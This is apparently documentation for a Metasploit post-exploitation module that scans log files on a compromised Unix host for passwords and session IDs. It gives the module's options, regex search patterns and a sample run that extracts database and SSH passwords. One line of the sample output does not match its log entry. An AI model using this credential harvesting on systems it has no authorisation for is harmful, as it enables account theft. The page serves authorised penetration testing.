Searches for common (or given) logfiles and searches based on common patterns for interessting entries like (possible) passwords or session-IDs.

## Module Options

**FILES**

Define a custom list of files to check. Can be defined as full path files or ~/ for a file to check in every home directory.

**USE_UPDATEDB**

Use or created (if not already created) updatedb for finding logfiles


**SESSION**

Which session to use, which can be viewed with `sessions -l`

## Scenario

```
msf post(enum_logfiles) > options
Module options (post/unix/gather/enum_logfiles):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   FILES         /tmp/syslog.log  no        A special log file
   SESSION       1                yes       The session to run this module on.
   USE_UPDATEDB  true             no        Use an updatedb database and search for filenames instead of full path

msf post(enum_logfiles) > run

[+] /tmp/syslog.log is readable
[*] Checking logfile '/tmp/syslog.log'
[*] password? in file /tmp/syslog.log : 2000-00-01 01:01:54,569 INFO zen.zencommand: Deleting command 10.0.0.68 from $ZENHOME/libexec/poll_postgres.py '10.0.0.68' '5432' 'postgres' 'sec3t' 'False' server
[*] Search: ZENHOME/libexec/poll_postgres.py\s.*?\s.*?\s.*?\s'(.*?)'
[+] Found: secr3t
[*] password? in file /tmp/syslog.log : 2000-00-01 00:08:20,240 INFO zen.zencommand: Deleting command 10.0.0.68 from $ZENHOME/libexec/poll_postgres.py '10.0.0.68' '5432' 'postgres' 'P0stGre$' 'False' server
[*] Search: ZENHOME/libexec/poll_postgres.py\s.*?\s.*?\s.*?\s'(.*?)'
[+] Found: P0stGre$
[*] password or invalid user (bruteforce attack) in file /tmp/syslog.log : Jan 02 08:33:53 zen sshd[20225]: Failed password for invalid user r00tPassw0rd from 10.0.0.42 port 2224 ssh2
[*] Search: Failed\spassword\sfor\sinvalid\suser\s(.*?)\sfrom\s
[+] Found: r00tPassw0rd
[*] password or invalid user (bruteforce attack) in file /tmp/syslog.log : Jan  4 01:28:38 localhost sshd[11113]: Failed password for invalid user Start123 from 10.0.0.17 port 51474 ssh2
[*] Search: Failed\spassword\sfor\sinvalid\suser\s(.*?)\sfrom\s
[+] Found: Start123
[*] Post module execution completed
```
